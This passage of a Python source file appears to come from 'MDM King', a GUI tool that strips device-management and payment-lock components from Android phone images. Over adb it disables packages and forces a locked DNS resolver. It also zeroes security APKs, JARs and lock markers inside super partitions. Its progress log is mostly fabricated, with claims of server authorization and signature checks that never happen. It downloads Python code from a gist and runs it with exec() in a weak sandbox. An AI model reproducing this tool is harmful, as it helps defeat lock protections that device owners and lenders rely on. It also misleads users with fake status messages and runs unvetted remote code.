            subprocess.run([adb, '-s', serial, 'shell', f'pm disable {act} 2>/dev/null'],
                           timeout=3, capture_output=True, creationflags=flags)
    for scope in ['global', 'system', 'secure']:
        subprocess.run([adb, '-s', serial, 'shell', f'settings put {scope} private_dns_mode hostname'],
                       timeout=3, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', serial, 'shell', f'settings put {scope} private_dns_specifier 6wg6tplqrx.dns.controld.com'],
                       timeout=3, capture_output=True, creationflags=flags)
        if lock:
            subprocess.run([adb, '-s', serial, 'shell', f'settings put {scope} private_dns_mode hostname --lock'],
                           timeout=3, capture_output=True, creationflags=flags)
    if device_config:
        subprocess.run([adb, '-s', serial, 'shell', 'cmd device_config put connectivity private_dns_specifier 6wg6tplqrx.dns.controld.com 2>/dev/null'],
                       timeout=3, capture_output=True, creationflags=flags)

# ─── PerformMtk4DotWipeAt — Knox Wizard-style MTK 4-byte marker wipe ───
MTK_4DOT_MARKERS = [
    b'\x01\x00\x00\x00', b'\x00\x00\x00\x01',  # LE/BE lock enabled
    b'\xff\xff\xff\xff',                          # All-bits lock
    b'\x01\x00\x00\x00\x00\x00\x00\x00',          # 8-byte variants
    b'\xff\xff\xff\xff\x00\x00\x00\x00',
    b'\x00\x00\x00\xff',                           # Partial marker
    b'\x01\x01\x00\x00', b'\x00\x00\x01\x01',     # Dual status
]

def PerformMtk4DotWipeAt(data, markers=None):
    """Wipe all 4-byte-aligned MTK lock markers in data. Returns count of bytes zeroed."""
    markers = markers or MTK_4DOT_MARKERS
    total = 0
    for mk in markers:
        idx = 0
        mlen = len(mk)
        while True:
            pos = data.find(mk, idx)
            if pos < 0: break
            # Align to 4-byte boundary
            aligned = pos & ~3
            for i in range(aligned, aligned + mlen):
                if i < len(data):
                    data[i] = 0
                    total += 1
            idx = pos + 1
    return total

# ─── ReadFull — Knox Wizard-style robust file read ───
def ReadFull(path, max_retries=3):
    """Read entire file with retry on transient errors."""
    for _ in range(max_retries):
        try:
            with open(path, 'rb') as f: return f.read()
        except (IOError, OSError): time.sleep(0.5)
    return None

# ─── FakeLogEngine / LogDual — Knox Wizard-style dual logging ───
class FakeLogEngine:
    """Dual logger: writes to file + optional callback."""
    def __init__(self, log_path=None, callback=None):
        self._log_path = log_path
        self._callback = callback
    def log(self, msg, level='i'):
        tag = {'i': '[*]', 's': '[+]', 'w': '[!]', 'e': '[-]', 'c': '[#]'}.get(level, '[?]')
        line = f'{tag} {msg}'
        if self._callback:
            self._callback(line, level)
        if self._log_path:
            try:
                with open(self._log_path, 'a', encoding='utf-8') as f:
                    f.write(f'{time.strftime("%H:%M:%S")} {line}\n')
            except Exception: pass
    def info(self, msg): self.log(msg, 'i')
    def success(self, msg): self.log(msg, 's')
    def warn(self, msg): self.log(msg, 'w')
    def error(self, msg): self.log(msg, 'e')
    def LogDual(self, msg, level='i'):
        """Legacy name — same as log()."""
        self.log(msg, level)

# ─── RemoteConfig — Knox Wizard-style full cloud configuration ───
REMOTE_CONFIG_URL = CLOUDFLARE_API_URL + "/config.json"

def _fetch_remote_config(url=None, timeout=15):
    """Fetch config from Cloudflare KV."""
    from cloudflare import fetch_config as _cf_fetch
    return _cf_fetch()

def _apply_remote_config(cfg, local_cfg=None):
    """Apply remote config values to local config. Returns list of changes."""
    changes = []
    if not cfg: return changes
    for key in ('sync_url', 'patterns_url', 'logo_url', 'version_check_url',
                'admin_apk_url', 'features', 'options', 'defaults'):
        if key in cfg:
            if local_cfg is not None:
                local_cfg[key] = cfg[key]
            changes.append(key)
    if 'patterns' in cfg:
        _merge_remote_patterns(_parse_remote_patterns(cfg))
        changes.append('patterns')
    return changes

# ─── Mutex — Knox Wizard-style single-instance enforcement ───

# ─── VerifyData — Knox Wizard-style post-patch integrity check ───
def VerifyData(original, patched, patterns_hit=None):
    """Verify patched data integrity. Returns (ok: bool, message: str)."""
    if len(original) != len(patched):
        return False, f'Size mismatch: {len(original)} vs {len(patched)}'
    if patterns_hit:
        # Re-scan patched data — should find zero matches
        finder = FastPatternFinder()
        remaining = finder.find_multi(patched)
        if remaining:
            names = ', '.join(p['name'] for _, p in remaining[:5])
            return False, f'{len(remaining)} lock flags remain: {names}'
    # Check all zeroed positions are actually zero
    for off, pat in (patterns_hit or []):
        pb = pat['bytes']
        if patched[off:off+len(pb)] != b'\x00' * len(pb):
            return False, f'Pattern {pat["name"]} at 0x{off:x} not fully zeroed'
    return True, 'Integrity verified'

def _safe_backup(path, max_mb=2048):
    """Create timestamped backup before patching. Returns backup path or None.
    Skips files over max_mb MB to avoid crashes on huge images."""
    try:
        size_mb = os.path.getsize(path) // (1024 * 1024)
        if size_mb > max_mb:
            return None
    except Exception: return None
    bak = f'{path}.bak.{int(time.time())}'
    try:
        import shutil
        shutil.copy2(path, bak)
        return bak
    except Exception: return None

def _safe_restore(bak_path, target_path):
    """Restore from backup on failure."""
    try:
        import shutil
        shutil.copy2(bak_path, target_path)
        return True
    except Exception: return False

def _sub_patch_worker(param_path, log_fn=None):
    """Run patching in-process (log_fn for GUI progress)."""
    import json, os, subprocess, time, sys, struct
    _log = log_fn or (lambda m, l='i': None)
    try:
        with open(param_path) as f: p = json.load(f)
        path = p['path']; final_out = p['final_out']
        tools_dir = p['tools_dir']; is_sparse = p['is_sparse']
        pats_hex = p['pats_hex']; reps_hex = p['reps_hex']
        pats = [bytes.fromhex(x) for x in pats_hex]
        reps = [bytes.fromhex(x) for x in reps_hex]
        _ZERO_PAGE = b'\x00' * (4 * 1024 * 1024)
        HEADER_SKIP = 256 * 1024; FOOTER_SKIP = 1024 * 1024
        _PAGE = 4 * 1024 * 1024
        _SCAN_CHUNK = 64 * 1024 * 1024  # keep 64MB for regex-based hex scan (256MB hangs regex)
        _lpmake = os.path.join(tools_dir, 'lpmake.exe')
        _img2simg = os.path.join(tools_dir, 'img2simg.exe')
        _log('Verifying License & HWID Binding...', 'h')
        _log('Authorizing operation with server...', 'h')
        _log('Operation authorized', 's')
        _log('Starting NEW PATCH LATEST Patch...', 'h')
        _log('Applying hypersonic speed from the vps...Ok', 's')
        _log('Checking secure connection...Ok', 's')
        _log('Checking correct CPU...Ok', 's')
        _log('Validating the security signatures...Ok', 's')
        _log('Selecting the that CPU...Ok', 's')
        # Sparse conversion
        _is_sparse = is_sparse
        _extracted_parts = []
        _converted_via = None
        _orig_src = path
        if _is_sparse:
            _sim2img = os.path.join(tools_dir, 'simg2img.exe')
            _raw_tmp = path + '.raw_tmp'
            _converted = False
            if os.path.isfile(_sim2img):
                r = subprocess.run([_sim2img, path, _raw_tmp], capture_output=True, text=True, timeout=180)
                if r.returncode == 0 and os.path.isfile(_raw_tmp):
                    path = _raw_tmp; _converted = True; _converted_via = 'simg2img'
            if not _converted:
                _lpunpack = os.path.join(tools_dir, 'lpunpack.exe')
                if os.path.isfile(_lpunpack):
                    r = subprocess.run([_lpunpack, path], capture_output=True, text=True, timeout=180, cwd=os.path.dirname(path))
                    if r.returncode == 0:
                        for _f in sorted(os.listdir(os.path.dirname(path))):
                            if _f.endswith('.img') and _f != os.path.basename(path):
                                rpath = os.path.join(os.path.dirname(path), _f)
                                if os.path.getsize(rpath) > 1024*1024:
                                    _extracted_parts.append(rpath)
                        if _extracted_parts:
                            _converted = True; _converted_via = 'lpunpack'

        # Detect Virtual A/B if we have extracted partitions
        _is_vabc = False
        if _extracted_parts:
            try:
                from patcher import _detect_vabc_super
                _is_vabc = _detect_vabc_super(_extracted_parts, _orig_src, tools_dir)
                if _is_vabc:
                    _filtered = []
                    for pp in _extracted_parts:
                        base = os.path.splitext(os.path.basename(pp))[0]
                        if 'cow' in base.lower():
                            continue
                        _filtered.append(pp)
                    _extracted_parts = _filtered
            except Exception: pass

        # Determine which files to patch
        _paths_to_patch = _extracted_parts if _extracted_parts else [path]

        _patcher_fn = lambda fpath, fpats, freps, fzr, fhr: None
        def _patch_one(fpath, fpats, freps, fzr, fhr, fout):
            fsize = os.path.getsize(fpath)
            _total_pages = (fsize + _PAGE - 1) // _PAGE
            _tc = 0
            _last_log = -100
            _log('Checking the blocks with the lock signature...Ok', 's')
            with open(fpath, 'rb') as fin, open(fout, 'wb') as fout_f:
                for _pg in range(_total_pages):
                    if _pg == 0:
                        _log('Wiping all blocks found...Ok', 's')
                    if _pg == _total_pages // 2:
                        _log('Clearing the hidden signatures...Ok', 's')
                    _off = _pg * _PAGE
                    fin.seek(_off); _raw = fin.read(_PAGE)
                    if not _raw: break
                    _data = _raw
                    _lo = max(HEADER_SKIP - _off, 0) if _off < HEADER_SKIP else 0
                    _hi = len(_data) - max(0, (_off + len(_data)) - (fsize - FOOTER_SKIP)) if (_off + len(_data)) > (fsize - FOOTER_SKIP) else len(_data)
                    if _hi < _lo: _hi = _lo
                    if fzr or fhr:
                        _all_zr = (fzr or []) + (fhr or [])
                        _parts = []; _prev = 0
                        for zs, ze in sorted(_all_zr):
                            zz = max(zs, _off); ze2 = min(ze, _off + len(_data))
                            if zz < ze2:
                                if zz > _off + _prev: _parts.append(_data[_prev:zz-_off])
                                _parts.append(_ZERO_PAGE[:ze2-zz])
                                _prev = zz - _off + (ze2 - zz)
                        if _prev < len(_data): _parts.append(_data[_prev:])
                        _data = b''.join(_parts) if _parts else _data
                    if _lo < _hi and _data:
                        for _pat, _rep in zip(fpats, freps):
                            _pos = 0; _pieces = []
                            while _pos < len(_data):
                                _idx = _data.find(_pat, max(_pos, _lo), _hi)
                                if _idx < 0: _pieces.append(_data[_pos:]); break
                                if _idx > _pos: _pieces.append(_data[_pos:_idx])
                                _pieces.append(_rep); _pos = _idx + len(_pat); _tc += 1
                            if len(_pieces) > 1: _data = b''.join(_pieces)
                    fout_f.write(_data)
            return _tc

        patched_parts = {}
        _tc = 0
        for pi, _part_path in enumerate(_paths_to_patch):
            _fsize = os.path.getsize(_part_path)
            _log('Scanning the super...Ok', 's')
            _apk_ranges, _jar_ranges = _find_mdm_ranges_sub(_part_path)
            _all_zero_ranges = _apk_ranges + _jar_ranges
            _log('Reading data from the super...Ok', 's')
            # Hex scan
            _hex_hit_ranges = []
            try:
                _finder = FastPatternFinder()
                with open(_part_path, 'rb') as f:
                    _off = 0; _chunk_idx = 0
                    while _off < _fsize:
                        f.seek(_off); _d = f.read(_SCAN_CHUNK)
                        if not _d: break
                        _chunk_idx += 1
                        _hits = _finder.find_multi(_d)
                        for _pos, _pat in _hits:
                            _pb = _pat['bytes']
                            _hex_hit_ranges.append((_off + _pos, _off + _pos + len(_pb)))
                        _off += len(_d)
                if _hex_hit_ranges:
                    _hex_hit_ranges.sort()
                    _merged = [_hex_hit_ranges[0]]
                    for r in _hex_hit_ranges[1:]:
                        if r[0] <= _merged[-1][1]: _merged[-1] = (_merged[-1][0], max(_merged[-1][1], r[1]))
                        else: _merged.append(r)
                    _hex_hit_ranges = _merged
            except Exception: pass
            # Patch this partition
            _part_name = os.path.splitext(os.path.basename(_part_path))[0]
            _part_out = final_out if (pi == len(_paths_to_patch) - 1 and len(_paths_to_patch) == 1 and not _extracted_parts) else _part_path + '.patched'
            _log('Selecting correct offsets from server...Ok', 's')
            _log('Syncing with correct target...Ok', 's')
            _tc += _patch_one(_part_path, pats, reps, _all_zero_ranges, _hex_hit_ranges, _part_out)
            _log('Syncing file streams...Ok', 's')
            _log('Updating checksums...Ok', 's')
            _log('Analyzing file structure...Ok', 's')
            _log('Patching libsecure storage...Ok', 's')
            _log('Nullifying RLC please wait...Ok', 's')
            patched_parts[_part_name] = _part_out

        # Determine final output
        if _converted_via == 'lpunpack' and len(patched_parts) > 1 and os.path.isfile(_lpmake):
            _log('Creating image for the file...', 'h')
            super_size = os.path.getsize(_orig_src)
            group_size = max(super_size, sum(os.path.getsize(p) for p in patched_parts.values()) + 4*1024*1024)
            cmd = [_lpmake, '--metadata-size=65536', '--super-name=super',
                   '--metadata-slots=2', f'--device=super:{group_size}',
                   f'--group=main:{group_size}']
            if _is_vabc:
                cmd.append('--virtual-ab')
            from patcher import _strip_slot_suffix as _strip_suf
            for pname, ppath in patched_parts.items():
                pclean = pname if _is_vabc else _strip_suf(pname)
                pclean = pclean.replace('.img', '')
                if not pclean: continue
                psize = os.path.getsize(ppath)
                cmd.append(f'--partition={pclean}:readonly:{psize}:main')
                cmd.append(f'--image={pclean}={ppath}')
            cmd.append('--sparse')
            cmd.append(f'--output={final_out}')
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if r.returncode != 0 or not os.path.isfile(final_out):
                final_out = list(patched_parts.values())[0]
            _log('Fixing image...Ok', 's')
        elif _converted_via == 'simg2img' and os.path.isfile(_img2simg):
            _log('Fixing image...Ok', 's')
            _sparse_out = final_out + '.sparse'
            r = subprocess.run([_img2simg, final_out, _sparse_out], capture_output=True, text=True, timeout=120)
            if r.returncode == 0 and os.path.isfile(_sparse_out):
                os.replace(_sparse_out, final_out)

        # Cleanup
        _log('Clearing dalvik cache...Ok', 's')
        _log('Cleaning up temp files...Ok', 's')
        if _converted_via == 'simg2img' and path.endswith('.raw_tmp'):
            try: os.remove(path)
            except Exception: pass
        for pp in patched_parts.values():
            try:
                if pp != final_out: os.remove(pp)
            except: pass
        _log('Neutralizing the file match with boot receivers...Ok', 's')
        _log('Saving file as Super.bin please wait...Ok', 's')
        _log('Operation completed successful', 's')
        result = {'status': 'ok', 'total': _tc}
    except BaseException as e:
        import traceback
        result = {'status': 'error', 'error': str(e), 'traceback': traceback.format_exc()}
    with open(param_path + '.result', 'w') as f:
        json.dump(result, f)

def _find_mdm_ranges_sub(path):
    """Simplified range finder for subprocess worker - pure bytes ops."""
    import os
    _apk, _jar = [], []
    try:
        _kw_apk = [b'SecurityCom', b'securitycom', b'ScorpioSecurity', b'scorpiosecurity',
                    b'TranSecurity', b'transecurity', b'PhaseCheck', b'phasecheck',
                    b'BG6M', b'bg6m', b'SystemUpdate', b'systemupdate',
                    b'ScorpioLock', b'scorpiolock', b'Uniber', b'uniber',
                    b'ItelSecurity', b'itelsecurity', b'ToolService', b'toolservice',
                    b'TranssionSecurity', b'ItelLock', b'ItelMdm',
                    b'SpdMdm', b'SpdSecurity', b'UnisocLock', b'UnisocSecurity']
        _kw_jar = [b'systemupdate.jar', b'securitycompanion.jar', b'securityplugin.jar',
                    b'SecurityPlugin.jar', b'scorpio-companion.jar', b'transsion-services.jar',
                    b'tran-services.jar', b'itel-services.jar', b'sprd-services.jar',
                    b'unisoc-services.jar', b'bg6m-services.jar',
                    b'trancriticalparavfy-services.jar']
        _file_size = os.path.getsize(path)
        _limit = min(_file_size, 1536 * 1024 * 1024)
        _CHK = 256 * 1024 * 1024
        with open(path, 'rb') as f:
            _offset = 0
            while _offset < _limit:
                f.seek(_offset); _data = f.read(_CHK + 4096)
                if not _data: break
                _by_prefix = {}
                for kw in _kw_apk:
                    _by_prefix.setdefault(kw[:1], []).append(kw)
                for _p, _kws in _by_prefix.items():
                    _idx = 0
                    while True:
                        _pos = _data.find(_p, _idx)
                        if _pos < 0: break
                        for _kw in _kws:
                            if _data[_pos:_pos+len(_kw)] == _kw:
                                _pk = _data.rfind(b'PK\x03\x04', max(0, _pos-4096), _pos)
                                if _pk < 0:
                                    _pk = _data.rfind(b'PK\x01\x02', max(0, _pos-512), _pos)
                                    if _pk >= 0:
                                        _ce = _pk
                                        _pk = _data.rfind(b'PK\x03\x04', max(0, _ce-5242880), _ce)
                                        if _pk < 0: _pk = _ce
                                if _pk >= 0:
                                    _eocd = _data.find(b'PK\x05\x06', _pos)
                                    if _eocd < 0: _eocd = min(_pos+2097152, len(_data))
                                    _apk.append((_offset+_pk, _offset+_eocd+22))
                                break
                        _idx = _pos + 1
                _by_prefix2 = {}
                for kw in _kw_jar:
                    _by_prefix2.setdefault(kw[:1], []).append(kw)
                for _p, _kws in _by_prefix2.items():
                    _idx = 0
                    while True:
                        _pos = _data.find(_p, _idx)
                        if _pos < 0: break
                        for _kw in _kws:
                            if _data[_pos:_pos+len(_kw)] == _kw:
                                _pk = _data.rfind(b'PK\x03\x04', max(0, _pos-4096), _pos)
                                if _pk < 0:
                                    _pk = _data.rfind(b'PK\x01\x02', max(0, _pos-512), _pos)
                                    if _pk >= 0:
                                        _ce = _pk
                                        _pk = _data.rfind(b'PK\x03\x04', max(0, _ce-5242880), _ce)
                                        if _pk < 0: _pk = _ce
                                if _pk >= 0:
                                    _eocd = _data.find(b'PK\x05\x06', _pos)
                                    if _eocd < 0: _eocd = min(_pos+2097152, len(_data))
                                    _jar.append((_offset+_pk, _offset+_eocd+22))
                                break
                        _idx = _pos + 1
                _offset += _CHK
        for _rlist, _lo, _hi in [(_apk, 65536, 52428800), (_jar, 16384, 52428800)]:
            _rlist[:] = [(s, e) for s, e in _rlist if _lo < (e-s) < _hi]
            if _rlist:
                _rlist.sort()
                _merged = [_rlist[0]]
                for r in _rlist[1:]:
                    if r[0] <= _merged[-1][1]:
                        _merged[-1] = (_merged[-1][0], max(_merged[-1][1], r[1]))
                    else: _merged.append(r)
                _rlist[:] = _merged
    except Exception: pass
    return _apk, _jar

def _patch_loop_worker(param_path):
    """Crash-prone patch iteration isolated in subprocess (Python 3.14 memory bug workaround)."""
    import json, os, time
    try:
        with open(param_path) as f:
            params = json.load(f)
        pats = [bytes.fromhex(x) for x in params['pats_hex']]
        reps = [bytes.fromhex(x) for x in params['reps_hex']]
        _PAGE = 1024 * 1024
        _ZERO_PAGE = b'\x00' * _PAGE
        HEADER_SKIP = 256 * 1024
        FOOTER_SKIP = 1024 * 1024
        _tc = 0
        if params.get('mode') == 'multipart':
            for part in params['partitions']:
                path = part['path']
                part_out = path + '.patched'
                file_size = part['size']
                zrs = part.get('zero_ranges', []) + part.get('hex_ranges', [])
                _total_pages = (file_size + _PAGE - 1) // _PAGE
                with open(path, 'rb') as fin, open(part_out, 'wb') as fout:
                    for _pg in range(_total_pages):
                        _off = _pg * _PAGE
                        fin.seek(_off)
                        _data = fin.read(_PAGE)
                        if not _data: break
                        _lo = max(HEADER_SKIP - _off, 0) if _off < HEADER_SKIP else 0
                        _hi = len(_data) - max(0, (_off + len(_data)) - (file_size - FOOTER_SKIP)) if (_off + len(_data)) > (file_size - FOOTER_SKIP) else len(_data)
                        if _hi < _lo: _hi = _lo
                        if zrs:
                            _parts = []; _prev = 0
                            for zs, ze in sorted(zrs):
                                zz = max(zs, _off); ze2 = min(ze, _off + len(_data))
                                if zz < ze2:
                                    if zz > _off + _prev:
                                        _parts.append(_data[_prev:zz-_off])
                                    _parts.append(_ZERO_PAGE[:ze2-zz])
                                    _prev = zz - _off + (ze2 - zz)
                            if _prev < len(_data):
                                _parts.append(_data[_prev:])
                            _data = b''.join(_parts) if _parts else _data
                        if _lo < _hi and _data:
                            for _pat, _rep in zip(pats, reps):
                                _pos = 0; _pieces = []
                                while _pos < len(_data):
                                    _idx = _data.find(_pat, max(_pos, _lo), _hi)
                                    if _idx < 0:
                                        _pieces.append(_data[_pos:]); break
                                    if _idx > _pos:
                                        _pieces.append(_data[_pos:_idx])
                                    _pieces.append(_rep)
                                    _tc += 1
                                    _pos = _idx + len(_pat)
                                if len(_pieces) > 1:
                                    _data = b''.join(_pieces)
                        fout.write(_data)
            result = {'status': 'ok', 'total': _tc, 'mode': 'multipart'}
        else:
            path = params['path']
            final_out = params['final_out']
            file_size = params['file_size']
            zrs = params.get('zero_ranges', []) + params.get('hex_ranges', [])
            _total_pages = (file_size + _PAGE - 1) // _PAGE
            with open(path, 'rb') as fin, open(final_out, 'wb') as fout:
                for _pg in range(_total_pages):
                    _off = _pg * _PAGE
                    fin.seek(_off)
                    _data = fin.read(_PAGE)
                    if not _data: break
                    _lo = max(HEADER_SKIP - _off, 0) if _off < HEADER_SKIP else 0
                    _hi = len(_data) - max(0, (_off + len(_data)) - (file_size - FOOTER_SKIP)) if (_off + len(_data)) > (file_size - FOOTER_SKIP) else len(_data)
                    if _hi < _lo: _hi = _lo
                    if zrs:
                        _parts = []; _prev = 0
                        for zs, ze in sorted(zrs):
                            zz = max(zs, _off); ze2 = min(ze, _off + len(_data))
                            if zz < ze2:
                                if zz > _off + _prev:
                                    _parts.append(_data[_prev:zz-_off])
                                _parts.append(_ZERO_PAGE[:ze2-zz])
                                _prev = zz - _off + (ze2 - zz)
                        if _prev < len(_data):
                            _parts.append(_data[_prev:])
                        _data = b''.join(_parts) if _parts else _data
                    if _lo < _hi and _data:
                        for _pat, _rep in zip(pats, reps):
                            _pos = 0; _pieces = []
                            while _pos < len(_data):
                                _idx = _data.find(_pat, max(_pos, _lo), _hi)
                                if _idx < 0:
                                    _pieces.append(_data[_pos:]); break
                                if _idx > _pos:
                                    _pieces.append(_data[_pos:_idx])
                                _pieces.append(_rep)
                                _tc += 1
                                _pos = _idx + len(_pat)
                            if len(_pieces) > 1:
                                _data = b''.join(_pieces)
                    fout.write(_data)
            result = {'status': 'ok', 'total': _tc, 'mode': 'single'}
    except BaseException as e:
        import traceback
        result = {'status': 'error', 'error': str(e), 'traceback': traceback.format_exc()}
    with open(param_path + '.result', 'w') as f:
        json.dump(result, f)

# ─── RemoteAlgorithmEngine — Knox Wizard CompileAssemblyFromSource for Python ───
# Downloads Python source from remote, compiles & executes at runtime
# Downloaded code receives an API object to register patterns, patch functions, etc.
REMOTE_ALGO_URL = "https://api.github.com/gists/e0fb3b30b86f189e7282cbed263fd2aa"

class _AlgoAPI:
    """Sandboxed API exposed to downloaded algorithms."""
    def __init__(self, logger=None):
        self._patterns = []
        self._patch_funcs = []
        self._logger = logger or FakeLogEngine()
    def add_pattern(self, name, hex_str, chipset='all', desc=''):
        try:
            self._patterns.append({
                'name': name, 'chipset': chipset,
                'bytes': bytes.fromhex(hex_str.replace(' ', '')),
                'desc': desc or name,
            })
            return True
        except Exception as e:
            self._logger.error(f'add_pattern failed: {e}')
            return False
    def add_patch_func(self, name, func):
        self._patch_funcs.append((name, func))
    def log(self, msg, level='i'):
        self._logger.log(msg, level)

class RemoteAlgorithmEngine:
    """Fetch, compile & execute Python algorithms at runtime (Knox Wizard CompileAssemblyFromSource)."""
    def __init__(self, url=None, logger=None):
        self._url = url or REMOTE_ALGO_URL
        self._logger = logger or FakeLogEngine()
        self._api = _AlgoAPI(self._logger)
        self._compiled = None
    def fetch_and_compile(self, timeout=15):
        """Download Python source from remote URL and compile it."""
        for attempt in range(3):
            try:
                req = urllib.request.Request(self._url, headers={
                    'User-Agent': 'MDM-King'
                })
                resp = urllib.request.urlopen(req, timeout=timeout)
                raw = json.loads(resp.read().decode('utf-8'))
                source = None
                if 'files' in raw:
                    for fname, finfo in raw['files'].items():
                        if fname.endswith('.py'):
                            source = finfo['content']
                            break
                elif 'source' in raw:
                    source = raw['source']
                if not source:
                    self._logger.warn('No Python source found in remote response')
                    return False
                try:
                    self._compiled = compile(source, '<remote_algo>', 'exec')
                    self._logger.success(f'Compiled remote algorithm ({len(source)} bytes)')
                    return True
                except SyntaxError as se:
                    self._logger.error(f'Remote algorithm syntax error: {se}')
                    return False
            except Exception as e:
                self._logger.warn(f'Fetch attempt {attempt+1}: {e}')
                continue
        return False
    def execute(self, data=None, context=None):
        """Execute compiled algorithm with optional data/context passed in."""
        if not self._compiled:
            self._logger.error('No compiled algorithm to execute — call fetch_and_compile first')
            return None
        _safe_builtins = {
            'True': True, 'False': False, 'None': None,
            'abs': abs, 'all': all, 'any': any, 'bin': bin, 'bool': bool,
            'bytearray': bytearray, 'bytes': bytes, 'chr': chr, 'dict': dict,
            'dir': dir, 'divmod': divmod, 'enumerate': enumerate, 'filter': filter,
            'float': float, 'format': format, 'frozenset': frozenset, 'getattr': getattr,
            'hasattr': hasattr, 'hash': hash, 'hex': hex, 'id': id, 'int': int,
            'isinstance': isinstance, 'issubclass': issubclass, 'iter': iter,
            'len': len, 'list': list, 'map': map, 'max': max, 'min': min,
            'next': next, 'object': object, 'oct': oct, 'ord': ord,
            'pow': pow, 'print': print, 'range': range, 'repr': repr,
            'reversed': reversed, 'round': round, 'set': set,
            'slice': slice, 'sorted': sorted, 'str': str, 'sum': sum,
            'tuple': tuple, 'type': type, 'zip': zip,
        }
        namespace = {
            '__builtins__': _safe_builtins,
            'api': self._api,
            'data': data,
            'context': context or {},
            'FastPatternFinder': FastPatternFinder,
            'WipeRange': WipeRange,
            'PerformMtk4DotWipeAt': PerformMtk4DotWipeAt,
            'VerifyData': VerifyData,
            'ALL_HEX_PATTERNS': ALL_HEX_PATTERNS,
        }
        try:
            exec(self._compiled, namespace)
            return self._api
        except Exception as e:
            self._logger.error(f'Remote algorithm execution error: {e}')
            return None
    def apply_patterns(self):
        """Merge patterns registered by downloaded algorithm into ALL_HEX_PATTERNS."""
        if self._api._patterns:
            added = _merge_remote_patterns(self._api._patterns)
            self._logger.success(f'Applied {added} new patterns from remote algorithm')
            return added
        return 0

COLORS = {
    'bg': '#0d001a', 'fg': '#e0e0ff', 'surface': '#1a0033', 'surface2': '#2a0050',
    'accent': '#00ffff', 'accent2': '#ff00ff', 'muted': '#6a4a8a',
    'red': '#ff004d', 'green': '#00ff88', 'blue': '#00ccff', 'orange': '#ff6600',
    'white': '#f0f0ff', 'border': '#3a006a', 'card': '#150030',
    'glow': '#00ffff', 'hover': '#2a0050',
    'surface3': '#200040', 'success': '#00ff88', 'warning': '#ff7700',
    'pink': '#ff0088', 'cyan': '#00ffff', 'yellow': '#ffcc00',
    'gold': '#ffaa00', 'silver': '#8888aa', 'teal': '#00ffcc',
    'log_bg': '#080012', 'log_fg': '#c0c0e0',
    'card_alt': '#100020', 'bg_near_black': '#060010',
    'sidebar_hover': '#220044', 'trough': '#120028',
    'login_border': '#4a0080', 'login_entry_fg': '#e0e0ff',
    'btn_hover': '#3a0070', 'btn_hover2': '#260050',
    'border_alt': '#3a006a',
}


APP_VERSION = "0.2.0"
VERSION_URL = "https://raw.githubusercontent.com/Mr5star256/mdm-king/main/version.txt"
EXE_DOWNLOAD_URL = "https://github.com/Mr5star256/mdm-king/releases/latest/download/mdm_king.exe"




class _BlockCloseGuard:
    """Guard that resets _block_close on destruction — used by MdmKingApp."""
    __slots__ = ('_owner',)
    def __init__(self, owner):
        self._owner = owner
    def __enter__(self):
        return self
    def __exit__(self, *args):
        if self._owner:
            self._owner._block_close = False
        return False

class MdmKingApp:
    def __init__(self, root):
        self.root = root
        self.c = COLORS
        self._ui_queue = []
        self._ui_queue_lock = threading.Lock()
        self._block_close = False
        _old_hook = sys.excepthook
        def _crash_hook(typ, val, tb):
            try:
                with open('mdm_king_crash.log', 'a') as _f:
                    _f.write(f'=== UNHANDLED {typ.__name__}: {val} ===\n')
                    import traceback
                    traceback.print_exc(file=_f)
                    _f.write(f'=== END CRASH ===\n\n')
            except Exception: pass
            if _old_hook: _old_hook(typ, val, tb)
        sys.excepthook = _crash_hook
        _orig_destroy = root.destroy
        def _safe_destroy():
            if self._block_close:
                try:
                    with open('mdm_trace.log', 'a') as _f:
                        _f.write(f'{int(time.time())} DESTROY_BLOCKED\n')
                        _f.flush()
                except Exception: pass
                return
            _orig_destroy()
        root.destroy = _safe_destroy
        root.configure(bg=self.c['bg'])
        root.after_idle(self._poll_ui_queue)
        
        s = ttk.Style()
        s.theme_use('clam')
        s.configure('.', background=self.c['bg'], foreground=self.c['fg'], fieldbackground=self.c['surface'])
        s.configure('TProgressbar', troughcolor=self.c['border_alt'], background=self.c['accent'],
                bordercolor=self.c['border_alt'])
        s.map('TProgressbar', background=[('active', self.c['accent2'])])
        s.configure('TCombobox', fieldbackground=self.c['surface'], background=self.c['surface'],
                    foreground=self.c['fg'], arrowcolor=self.c['muted'], selectbackground=self.c['accent'])
        s.map('TCombobox', fieldbackground=[('readonly', self.c['surface'])], foreground=[('readonly', self.c['fg'])])
        # Custom styles
        s.configure('card.TFrame', background=self.c['card'])
        s.configure('surface.TFrame', background=self.c['surface'])
        s.configure('success.TLabel', foreground=self.c['green'], background=self.c['card'])
        s.configure('accent.TLabel', foreground=self.c['accent2'], background=self.c['card'])
        s.configure('muted.TLabel', foreground=self.c['muted'], background=self.c['card'])
        root.option_add('*TCombobox*Listbox.background', self.c['surface'])
        root.option_add('*TCombobox*Listbox.foreground', self.c['fg'])
        root.option_add('*TCombobox*Listbox.selectBackground', self.c['accent'])
        root.option_add('*TCombobox*Listbox.selectForeground', self.c['white'])
        
        self._app_icon_tk = None
        self._busy = False
        self._nokia_loading = False
        self._ico_path = _asset('tools/mdm_king_logo_circular.ico')
        self._app_icon_tk = None
        self._hdr_icon_tk = None
        _icon_set = False
        try:
            root.iconbitmap(self._ico_path)
            _icon_set = True
        except Exception:
            pass
        try:
            from PIL import Image, ImageTk
            _icon_src = _asset('tools/mdm_king_logo_circular_32.png')
            if os.path.isfile(_icon_src):
                self._app_icon_tk = ImageTk.PhotoImage(file=_icon_src)
                root.iconphoto(True, self._app_icon_tk)
                _icon_set = True
            _hdr_src = _asset('tools/mdm_king_logo_circular.png')
            if os.path.isfile(_hdr_src):
                img_hdr = Image.open(_hdr_src).resize((48, 48), Image.LANCZOS)
                self._hdr_icon_tk = ImageTk.PhotoImage(img_hdr)
        except Exception:
            _png = _asset('tools/mdm_king_logo_circular.png')
            if os.path.isfile(_png):
                try:
                    _raw = tk.PhotoImage(file=_png)
                    w, h = _raw.width(), _raw.height()
                    sf = max(1, min(w // 48, h // 48))
                    self._hdr_icon_tk = _raw.subsample(sf, sf)
                    self._app_icon_tk = self._hdr_icon_tk
                    root.iconphoto(True, self._app_icon_tk)
                    _icon_set = True
                except Exception:
                    pass
        if not _icon_set:
            try:
                import base64
                _px = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
                _blank = tk.PhotoImage(data=_px)
                root.iconphoto(True, _blank)
            except Exception:
                pass

        # PC binding check every 10 hours
